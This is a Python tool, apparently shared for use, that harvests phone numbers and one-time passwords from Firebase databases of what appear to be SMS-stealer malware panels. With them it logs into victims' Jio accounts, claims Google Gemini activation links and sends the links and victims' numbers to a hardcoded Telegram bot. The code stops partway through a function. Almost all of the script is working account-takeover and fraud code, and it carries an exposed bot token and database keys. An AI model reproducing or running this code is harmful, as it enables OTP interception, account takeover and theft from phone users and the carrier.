"""
Jio Gemini Activation Scanner - ULTIMATE EDITION
✅ Threading (quét song song tất cả panels)
✅ Loop liên tục tự động
✅ Telegram notification khi tìm được link
✅ OTP timeout tăng lên 30s
✅ Bỏ qua panel chết nhanh hơn
✅ Log đẹp hơn với emoji
"""

from __future__ import annotations
import csv
import html
import re
import time
import threading
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo

import requests

# ==================== CONFIG ====================

TELEGRAM_TOKEN  = "8980675805:AAH_eEwOAcJOxk8XM0jqCtcQq4JL6kgTGMY"
TELEGRAM_CHAT_ID = "7353915691"

MESSAGE_SCAN_LIMIT  = 200       # Tăng 150 → 200
OTP_TIMEOUT         = 45        # 45 giây là đủ
POLL_INTERVAL       = 1
PANEL_TIMEOUT       = 8         # Timeout kết nối tới panel (giây)
MAX_PANEL_WORKERS   = 40        # Tăng 30 → 40 luồng
OTP_MAX_RETRIES     = 2         # Retry 2 lần (tổng 2 lần × 45s = 90s max)
LOOP_INTERVAL       = 60         # Nghỉ giữa các vòng lặp (giây) — 1 phút
MAX_LOOPS           = 0         # 0 = vô hạn

LINKS_FILE   = Path("gemini_activation_links.txt")
RESULTS_FILE = Path("gemini_results.csv")

# ==================== ALL PANELS ====================

FIREBASE_PANELS = [
    # Original panels
    ("https://cep10hui-default-rtdb.firebaseio.com", "https://cep10hui-default-rtdb.firebaseio.com"),
    ("https://tinobiggan-default-rtdb.firebaseio.com", "https://tinobiggan-default-rtdb.firebaseio.com"),
    ("https://atifgndu-default-rtdb.firebaseio.com", "https://atifgndu-default-rtdb.firebaseio.com"),
    ("https://jsisbeuve-default-rtdb.firebaseio.com", "https://jsisbeuve-default-rtdb.firebaseio.com"),
    ("https://fir-27c9e-default-rtdb.firebaseio.com", "AizAsyA7EOpeZLDxPAYcS2_nb1J2ZKr4TNCgp6Q"),
    ("https://rupesh-6c5e5-default-rtdb.firebaseio.com", "AizAsyAFML11FrkfFMx0c4hOYqaCKUNVj5f8XhA"),
    ("https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-742d2-default-rtdb.firebaseio.com"),
    ("https://santosh-8-default-rtdb.firebaseio.com", "https://santosh-8-default-rtdb.firebaseio.com"),
    ("https://yqhw2-fb47-default-rtdb.firebaseio.com", "AizAsyAdvY2CkMHoY3Ww_ah6b0pFdNKNTHKZnypUY"),
    ("https://ikka-83d65-default-rtdb.firebaseio.com", "https://ikka-83d65-default-rtdb.firebaseio.com"),
    ("https://master-panel-6bcfc-default-rtdb.firebaseio.com", "https://master-panel-6bcfc-default-rtdb.firebaseio.com"),
    ("https://landelle-20855-default-rtdb.firebaseio.com", "https://landelle-20855-default-rtdb.firebaseio.com"),
    ("https://autobot7-214ee-default-rtdb.firebaseio.com", "https://autobot7-214ee-default-rtdb.firebaseio.com"),
    ("https://shilpa-e712a-default-rtdb.firebaseio.com", "https://shilpa-e712a-default-rtdb.firebaseio.com"),
    ("https://dath-da88a-default-rtdb.firebaseio.com", "https://dath-da88a-default-rtdb.firebaseio.com"),
    ("https://apkdir-default-rtdb.firebaseio.com", "https://apkdir-default-rtdb.firebaseio.com"),
    ("https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://apkpure-6eb6a-default-rtdb.firebaseio.com"),
    ("https://hdjdjdj-a73f2-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com"),
    ("https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com", "https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com"),
    ("https://anvith6-9450e-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com"),
    ("https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jayma-9ce22-default-rtdb.firebaseio.com"),
    ("https://konaio-default-rtdb.firebaseio.com", "https://konaio-default-rtdb.firebaseio.com"),
    ("https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-34345-default-rtdb.firebaseio.com"),
    ("https://apkdir-f6fb9-default-rtdb.firebaseio.com", "https://apkdir-f6fb9-default-rtdb.firebaseio.com"),
    ("https://vibe-d238e-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com"),
    ("https://alienware-c11b0-default-rtdb.firebaseio.com", "https://alienware-c11b0-default-rtdb.firebaseio.com"),
    ("https://csforme-dc64a-default-rtdb.firebaseio.com", "AizAsyCEk7GmmKKwJSCAjCDIxOa8AISQZyxy6bw"),
    ("https://max-a-cbe29-default-rtdb.firebaseio.com", "AizAsyCQeygjNYLwmbf_ZC86gvRye7XBI-BIBawq"),
    # Decoded from Netlify URLs
    ("https://raaz-5287d-default-rtdb.firebaseio.com", "Hebdixnd"),
    ("https://singhaan-6f199-default-rtdb.firebaseio.com", "AizAsyD-1Gvt2cmr0mv1x0K4V9vtjVMXyJVLAv"),
    ("https://painislv-default-rtdb.firebaseio.com", "AizAsyCqnjDPgVCaE36q7N4HbdfUEB9FbluM8pDs"),
    ("https://risho-d4c66-default-rtdb.firebaseio.com", "AizAsyBkccFcNJ-FfClxHMzrRAyropULYvexsW0"),
    ("https://runjun-master-panel-default-rtdb.firebaseio.com", "AizAsyBawSxrOxhTZk7C2V0-LkcoyEs7n6y4msw"),
    ("https://tinmn88-b7db5-default-rtdb.firebaseio.com", "AizAsyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf"),
    ("https://e14turnament2-default-rtdb.firebaseio.com", "AizAsyBIJawvyJ8SHeZ14iLesyx4bAOr8EPGt"),
    ("https://newspreding-default-rtdb.firebaseio.com", "AizAsyDsWt99EDO-HdTmG3U9tARSElpki13JWFo"),
    ("https://bossbun-default-rtdb.firebaseio.com", "AizAsyBfqObM5HnK6khogyF4ytOX7E9N0e_lAQ"),
    ("https://jpicku-47790-default-rtdb.firebaseio.com", "https://jpicku-47790-default-rtdb.firebaseio.com"),
    ("https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com", "https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com"),
    ("https://annu-f0207-default-rtdb.firebaseio.com", "https://annu-f0207-default-rtdb.firebaseio.com"),
    ("https://strange-2e4aa-default-rtdb.firebaseio.com", "https://strange-2e4aa-default-rtdb.firebaseio.com"),
    ("https://customer-support-5-default-rtdb.firebaseio.com", "https://customer-support-5-default-rtdb.firebaseio.com"),
    ("https://muajob-29c86-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com"),
    ("https://totala-panel-default-rtdb.firebaseio.com", "https://totala-panel-default-rtdb.firebaseio.com"),
    ("https://kingu-2dbb9-default-rtdb.firebaseio.com", "https://kingu-2dbb9-default-rtdb.firebaseio.com"),
    ("https://rajabhaya-default-rtdb.firebaseio.com", "https://rajabhaya-default-rtdb.firebaseio.com"),
    ("https://heisenberg-8c3da-default-rtdb.firebaseio.com", "https://heisenberg-8c3da-default-rtdb.firebaseio.com"),
    ("https://customer-support-12e40-default-rtdb.firebaseio.com", "https://customer-support-12e40-default-rtdb.firebaseio.com"),
    ("https://sada-bcbcd-default-rtdb.firebaseio.com", "https://sada-bcbcd-default-rtdb.firebaseio.com"),
    ("https://bharat56-b6ee1-default-rtdb.firebaseio.com", "https://bharat56-b6ee1-default-rtdb.firebaseio.com"),
    ("https://phone55-d7d89-default-rtdb.firebaseio.com", "https://phone55-d7d89-default-rtdb.firebaseio.com"),
    ("https://e9turnament1-default-rtdb.firebaseio.com", "https://e9turnament1-default-rtdb.firebaseio.com"),
    ("https://colana-84ce2-default-rtdb.firebaseio.com", "https://colana-84ce2-default-rtdb.firebaseio.com"),
    ("https://hospital-14-default-rtdb.firebaseio.com", "https://hospital-14-default-rtdb.firebaseio.com"),
    # More panels
    ("https://vdgsh-623ed-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com"),
    ("https://arvind-c5b03-default-rtdb.firebaseio.com", "https://arvind-c5b03-default-rtdb.firebaseio.com"),
    ("https://axisjames-default-rtdb.firebaseio.com", "https://axisjames-default-rtdb.firebaseio.com"),
    ("https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "AizAsyBl3179G60c2LzYPrbkp4tmuRKK_7H0_0g"),
    ("https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://krijhjuiiccyy-default-rtdb.firebaseio.com", "https://krijhjuiiccyy-default-rtdb.firebaseio.com"),
    ("https://youbabu-default-rtdb.firebaseio.com", "https://youbabu-default-rtdb.firebaseio.com"),
    ("https://kali-1b217-default-rtdb.firebaseio.com", "https://kali-1b217-default-rtdb.firebaseio.com"),
    ("https://sallu-9934f-default-rtdb.firebaseio.com", "https://sallu-9934f-default-rtdb.firebaseio.com"),
    ("https://chinky-d92ab-default-rtdb.firebaseio.com", "https://chinky-d92ab-default-rtdb.firebaseio.com"),
    ("https://loddysingh-6d511-default-rtdb.firebaseio.com", "https://loddysingh-6d511-default-rtdb.firebaseio.com"),
    ("https://simadevi-f42fc-default-rtdb.firebaseio.com", "https://simadevi-f42fc-default-rtdb.firebaseio.com"),
    ("https://olamigo-41620-default-rtdb.firebaseio.com", "https://olamigo-41620-default-rtdb.firebaseio.com"),
    ("https://anup-f900e-default-rtdb.firebaseio.com", "https://anup-f900e-default-rtdb.firebaseio.com"),
    ("https://bishnu-a0e01-default-rtdb.firebaseio.com", "https://bishnu-a0e01-default-rtdb.firebaseio.com"),
    ("https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app", "https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://hdhdusgsvshshshs-default-rtdb.firebaseio.com", "https://hdhdusgsvshshshs-default-rtdb.firebaseio.com"),
    ("https://sastaapp-394cd-default-rtdb.firebaseio.com", "https://sastaapp-394cd-default-rtdb.firebaseio.com"),
    # Panels from Panels.py (firexpanel decoded)
    ("https://gautam-febce-default-rtdb.firebaseio.com", "https://gautam-febce-default-rtdb.firebaseio.com"),
    ("https://rcbfan-1c031-default-rtdb.firebaseio.com", "https://rcbfan-1c031-default-rtdb.firebaseio.com"),
    ("https://taetan-d810f-default-rtdb.firebaseio.com", "https://taetan-d810f-default-rtdb.firebaseio.com"),
    ("https://myname-cc45a-default-rtdb.firebaseio.com", "https://myname-cc45a-default-rtdb.firebaseio.com"),
    ("https://arunhah-902ef-default-rtdb.firebaseio.com", "https://arunhah-902ef-default-rtdb.firebaseio.com"),
    ("https://amit-ka-71-default-rtdb.firebaseio.com", "https://amit-ka-71-default-rtdb.firebaseio.com"),
    ("https://mustakbhai-798bd-default-rtdb.asia-southeast1.firebasedatabase.app", "https://mustakbhai-798bd-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://maxjoker98-2cdfe-default-rtdb.firebaseio.com", "https://maxjoker98-2cdfe-default-rtdb.firebaseio.com"),
    ("https://ayuuuu-11-default-rtdb.firebaseio.com", "https://ayuuuu-11-default-rtdb.firebaseio.com"),
    ("https://jamesbondd5-default-rtdb.firebaseio.com", "https://jamesbondd5-default-rtdb.firebaseio.com"),
    ("https://whithex-741e0-default-rtdb.firebaseio.com", "https://whithex-741e0-default-rtdb.firebaseio.com"),
    ("https://sumit1-82dcd-default-rtdb.firebaseio.com", "https://sumit1-82dcd-default-rtdb.firebaseio.com"),
    ("https://emesh-94556-default-rtdb.firebaseio.com", "https://emesh-94556-default-rtdb.firebaseio.com"),
    ("https://dost-42d3f-default-rtdb.firebaseio.com", "https://dost-42d3f-default-rtdb.firebaseio.com"),
    ("https://axis-c4bd3-default-rtdb.firebaseio.com", "https://axis-c4bd3-default-rtdb.firebaseio.com"),
    ("https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app", "https://gunpawdar-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://hackerr-19f0c-default-rtdb.firebaseio.com", "https://hackerr-19f0c-default-rtdb.firebaseio.com"),
    ("https://godsbase-7c42e-default-rtdb.firebaseio.com", "https://godsbase-7c42e-default-rtdb.firebaseio.com"),
    ("https://oyilo-5cada-default-rtdb.firebaseio.com", "https://oyilo-5cada-default-rtdb.firebaseio.com"),
    ("https://santo-dcd23-default-rtdb.firebaseio.com", "https://santo-dcd23-default-rtdb.firebaseio.com"),
    ("https://nisha-randi-default-rtdb.firebaseio.com", "https://nisha-randi-default-rtdb.firebaseio.com"),
    ("https://aaaa-3bd33-default-rtdb.firebaseio.com", "https://aaaa-3bd33-default-rtdb.firebaseio.com"),
    ("https://navin-9fb56-default-rtdb.firebaseio.com", "https://navin-9fb56-default-rtdb.firebaseio.com"),
    ("https://gren-ff2af-default-rtdb.firebaseio.com", "https://gren-ff2af-default-rtdb.firebaseio.com"),
    ("https://yohichahiye-default-rtdb.firebaseio.com", "https://yohichahiye-default-rtdb.firebaseio.com"),
    ("https://krisna574-ffef3-default-rtdb.firebaseio.com", "https://krisna574-ffef3-default-rtdb.firebaseio.com"),
    ("https://panelwalababa-ddd53-default-rtdb.firebaseio.com", "https://panelwalababa-ddd53-default-rtdb.firebaseio.com"),
    ("https://xoid-arif-default-rtdb.firebaseio.com", "https://xoid-arif-default-rtdb.firebaseio.com"),
    ("https://free-hospital-default-rtdb.firebaseio.com", "https://free-hospital-default-rtdb.firebaseio.com"),
    ("https://chut-569a0-default-rtdb.asia-southeast1.firebasedatabase.app", "https://chut-569a0-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://union-b656e-default-rtdb.firebaseio.com", "https://union-b656e-default-rtdb.firebaseio.com"),
    ("https://shoot-admin-68edc-default-rtdb.firebaseio.com", "https://shoot-admin-68edc-default-rtdb.firebaseio.com"),
    ("https://monikamandalofficial-d64a4-default-rtdb.firebaseio.com", "https://monikamandalofficial-d64a4-default-rtdb.firebaseio.com"),
    ("https://brodj-162c6-default-rtdb.firebaseio.com", "https://brodj-162c6-default-rtdb.firebaseio.com"),
    ("https://biibiiiuiii-default-rtdb.firebaseio.com", "https://biibiiiuiii-default-rtdb.firebaseio.com"),
    ("https://pintu-3f058-default-rtdb.firebaseio.com", "https://pintu-3f058-default-rtdb.firebaseio.com"),
    ("https://flash-v8enginepower-default-rtdb.firebaseio.com", "https://flash-v8enginepower-default-rtdb.firebaseio.com"),
    ("https://rambhai-2c356-default-rtdb.firebaseio.com", "https://rambhai-2c356-default-rtdb.firebaseio.com"),
    ("https://ramesh-67a2b-default-rtdb.firebaseio.com", "https://ramesh-67a2b-default-rtdb.firebaseio.com"),
    ("https://ranu-e604c-default-rtdb.firebaseio.com", "https://ranu-e604c-default-rtdb.firebaseio.com"),
    ("https://palms-568c7-default-rtdb.firebaseio.com", "https://palms-568c7-default-rtdb.firebaseio.com"),
    ("https://panel-9-d6ece-default-rtdb.firebaseio.com", "https://panel-9-d6ece-default-rtdb.firebaseio.com"),
    ("https://yellow-new-panel-srt-rto-zziam-default-rtdb.firebaseio.com", "https://yellow-new-panel-srt-rto-zziam-default-rtdb.firebaseio.com"),
    ("https://anju-db1c1-default-rtdb.firebaseio.com", "https://anju-db1c1-default-rtdb.firebaseio.com"),
    ("https://surajkiwife-9b0e2-default-rtdb.firebaseio.com", "https://surajkiwife-9b0e2-default-rtdb.firebaseio.com"),
    ("https://adani-5dd2c-default-rtdb.firebaseio.com", "https://adani-5dd2c-default-rtdb.firebaseio.com"),
    ("https://jnzbczbkjgzkg-default-rtdb.firebaseio.com", "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com"),
    ("https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com", "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com"),
    ("https://krijhjuiiiccyy-default-rtdb.firebaseio.com", "https://krijhjuiiiccyy-default-rtdb.firebaseio.com"),
    ("https://kalih-f389d-default-rtdb.firebaseio.com", "https://kalih-f389d-default-rtdb.firebaseio.com"),
    ("https://deepk-hh-default-rtdb.firebaseio.com", "https://deepk-hh-default-rtdb.firebaseio.com"),
    ("https://desert-fc320-default-rtdb.firebaseio.com", "https://desert-fc320-default-rtdb.firebaseio.com"),
    ("https://mook-1ddfc-default-rtdb.firebaseio.com", "https://mook-1ddfc-default-rtdb.firebaseio.com"),
    ("https://check-skyler-default-rtdb.firebaseio.com", "https://check-skyler-default-rtdb.firebaseio.com"),
    ("https://maxo12-default-rtdb.firebaseio.com", "https://maxo12-default-rtdb.firebaseio.com"),
    ("https://crdio-3cf5c-default-rtdb.firebaseio.com", "https://crdio-3cf5c-default-rtdb.firebaseio.com"),
    ("https://aditya-9f66b-default-rtdb.firebaseio.com", "https://aditya-9f66b-default-rtdb.firebaseio.com"),
    ("https://madam-ji-17e1c-default-rtdb.firebaseio.com", "https://madam-ji-17e1c-default-rtdb.firebaseio.com"),
    ("https://keepsnss-default-rtdb.firebaseio.com", "https://keepsnss-default-rtdb.firebaseio.com"),
    ("https://uday-d4bda-default-rtdb.firebaseio.com", "https://uday-d4bda-default-rtdb.firebaseio.com"),
    ("https://rikiad-d2c69-default-rtdb.firebaseio.com", "https://rikiad-d2c69-default-rtdb.firebaseio.com"),
    ("https://joker-45933-default-rtdb.firebaseio.com", "https://joker-45933-default-rtdb.firebaseio.com"),
    ("https://alok5u2-default-rtdb.firebaseio.com", "https://alok5u2-default-rtdb.firebaseio.com"),
    ("https://rto-office-e1c0c-default-rtdb.firebaseio.com", "https://rto-office-e1c0c-default-rtdb.firebaseio.com"),
    ("https://aditya-2a0a4-default-rtdb.firebaseio.com", "https://aditya-2a0a4-default-rtdb.firebaseio.com"),
    ("https://naina-singh-default-rtdb.firebaseio.com", "https://naina-singh-default-rtdb.firebaseio.com"),
    ("https://thomas-maderchod-default-rtdb.firebaseio.com", "https://thomas-maderchod-default-rtdb.firebaseio.com"),
    ("https://rantuwnzusjsjsndhej6sb-default-rtdb.firebaseio.com", "https://rantuwnzusjsjsndhej6sb-default-rtdb.firebaseio.com"),
    ("https://ro999i9-default-rtdb.firebaseio.com", "https://ro999i9-default-rtdb.firebaseio.com"),
    ("https://arifyellow-efd98-default-rtdb.firebaseio.com", "https://arifyellow-efd98-default-rtdb.firebaseio.com"),
    ("https://gfgg-72129-default-rtdb.firebaseio.com", "https://gfgg-72129-default-rtdb.firebaseio.com"),
    ("https://rahul-admin-b6ebe-default-rtdb.firebaseio.com", "https://rahul-admin-b6ebe-default-rtdb.firebaseio.com"),
    ("https://babuji-efd18-default-rtdb.firebaseio.com", "https://babuji-efd18-default-rtdb.firebaseio.com"),
    ("https://kammarene-default-rtdb.firebaseio.com", "https://kammarene-default-rtdb.firebaseio.com"),
]

# ==================== API URLs ====================

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL     = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL   = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL         = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL     = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL     = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL       = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL       = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE      = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

# ==================== PATTERNS ====================

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bmobile\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bnumber\s*[:=-]\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bsim\s*(?:number|no[.]?)?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bjio\b[^\d]{0,20}([6-9]\d{9})"),   # "Jio ...bất kỳ... số"
    re.compile(r"(?i)(?:[+]91|91)([6-9]\d{9})"),          # +91xxxxxxxxxx hoặc 91xxxxxxxxxx — specific hơn
    # ⚠️ KHÔNG dùng catch-all \b([6-9]\d{9})\b → bắt cả OTP, timestamp → 3000+ false positives
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN      = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number", "device_id", "mobile_number",
    "status", "activation_url", "nepal_date", "nepal_time",
)

# ---- Cache cross-vòng ----
# Số đã xác nhận KHÔNG PHẢI Jio → skip ở vòng sau (tiết kiệm API)
_not_jio_cache: set[str] = set()
_not_jio_lock  = threading.Lock()

# Số đã kích hoạt thành công → không xử lý lại
_done_cache: set[str] = set()
_done_lock   = threading.Lock()

# ==================== TELEGRAM ====================

_tg_lock = threading.Lock()

def send_telegram(text: str) -> bool:
    """Gửi tin nhắn Telegram."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=15)
        return resp.ok
    except Exception:
        return False

def notify_activation(serial: int, mobile: str, url: str) -> None:
    """Gửi thông báo Telegram khi tìm được link kích hoạt."""
    now = datetime.now(ZoneInfo("Asia/Kathmandu"))
    msg = (
        "🎉 <b>GEMINI ACTIVATION FOUND!</b>\n\n"
        f"📱 <b>Mobile:</b> <code>+91{mobile}</code>\n"
        f"🔢 <b>Serial:</b> #{serial}\n"
        f"🕐 <b>Time:</b> {now.strftime('%Y-%m-%d %H:%M:%S')} (NPT)\n\n"
        f"🔗 <b>Link:</b>\n<code>{url}</code>"
    )
    with _tg_lock:
        ok = send_telegram(msg)
    if ok:
        print(f"  📤 Đã gửi Telegram thành công!")
    else:
        print(f"  ⚠️  Gửi Telegram thất bại")

def notify_summary(loop_num: int, total_online: int, total_numbers: int, statuses: Counter) -> None:
    """Gửi tóm tắt mỗi vòng lặp."""
    now = datetime.now(ZoneInfo("Asia/Kathmandu"))
    found = statuses.get("activation_url_found", 0)
    lines = [
        f"📊 <b>Vòng #{loop_num} hoàn tất</b>",
        f"🕐 {now.strftime('%Y-%m-%d %H:%M:%S')} (NPT)",
        f"",
        f"📡 Thiết bị online: <b>{total_online}</b>",
        f"📱 Số điện thoại: <b>{total_numbers}</b>",
        f"✅ Link tìm được: <b>{found}</b>",
    ]
    for status, count in sorted(statuses.items()):
        if status != "activation_url_found":
            lines.append(f"  • {status}: {count}")
    with _tg_lock:
        send_telegram("\n".join(lines))

# ==================== FIREBASE ====================

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return session

def firebase_get(session: requests.Session, base_url: str, key: str, path: str,
                 params: dict[str, Any] | None = None) -> Any:
    if key and key.startswith("http"):
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=PANEL_TIMEOUT)
    else:
        query: dict[str, Any] = {"auth": key}
        if params:
            query.update(params)
        response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=PANEL_TIMEOUT)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str,
                    device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    data = firebase_get(session, base_url, key, f"messages/{device_id}",
                        {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def scan_panel(base_url: str, firebase_key: str) -> dict[str, dict[str, Any]]:
    """Quét 1 panel, thử nhiều path khác nhau. Thread-safe."""
    result: dict[str, dict[str, Any]] = {}
    firebase = firebase_session()
    # Thử nhiều path phổ biến — mỗi panel có thể dùng cấu trúc khác nhau
    PATHS_TO_TRY = ["clients", "users", "devices", "online", "data", "registered"]
    try:
        for path in PATHS_TO_TRY:
            try:
                if firebase_key and firebase_key.startswith("http"):
                    response = firebase.get(f"{base_url}/{path}.json", timeout=PANEL_TIMEOUT)
                else:
                    response = firebase.get(f"{base_url}/{path}.json?auth={firebase_key}", timeout=PANEL_TIMEOUT)

                if response.status_code != 200:
                    continue
                clients = response.json()
                if not isinstance(clients, dict):
                    continue
                found = 0
                for device_id, data in clients.items():
                    if not isinstance(data, dict):
                        continue
                    # Chấp nhận nếu status=True hoặc có field online/active
                    is_online = (
                        data.get("status") is True
                        or data.get("online") is True
                        or data.get("active") is True
                        or str(data.get("status", "")).lower() in {"online", "true", "1"}
                    )
                    if is_online:
                        result[device_id] = {
                            "base_url": base_url,
                            "firebase_key": firebase_key,
                            "firebase_session": firebase,
                            "data": data,
                            "path": path,
                        }
                        found += 1
                if found:
                    break   # Tìm thấy ở path này rồi, không cần thử tiếp
            except Exception:
                continue
    except Exception:
        pass
    return result

# ==================== NUMBER / OTP ====================

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

# ==================== JIO SESSION ====================

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=15)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def wait_for_otp(firebase: requests.Session, base_url: str, key: str,
                 device_id: str, known_keys: set[str], jio: requests.Session, mobile: str,
                 used: set[str] | None = None) -> bool:
    """Chờ OTP. `used` được chia sẻ giữa các lần retry để không thử lại OTP cũ đã fail."""
    if used is None:
        used = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            print(f"  🔑 OTP nhận được: {otp}")
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

# ==================== ACTIVATION ====================

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
